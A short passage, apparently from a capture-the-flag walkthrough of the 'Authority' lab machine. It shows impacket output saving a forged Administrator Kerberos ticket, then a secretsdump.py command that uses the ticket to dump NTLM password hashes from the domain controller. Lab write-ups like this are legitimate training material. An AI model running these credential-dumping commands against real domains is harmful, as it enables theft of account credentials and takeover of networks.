@@ -1,0 +1,1 @@
+lf [*] Requesting S4U2Proxy [*] Saving ticket in Administrator.ccache With this, I can dump the NTLM hashes from the DC: oxdf@hacky$ KRB5CCNAME = Administrator.ccache secretsdump.py -k -no-pass authority.htb/administrator@authority.authority.htb -just-dc-ntlm Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022
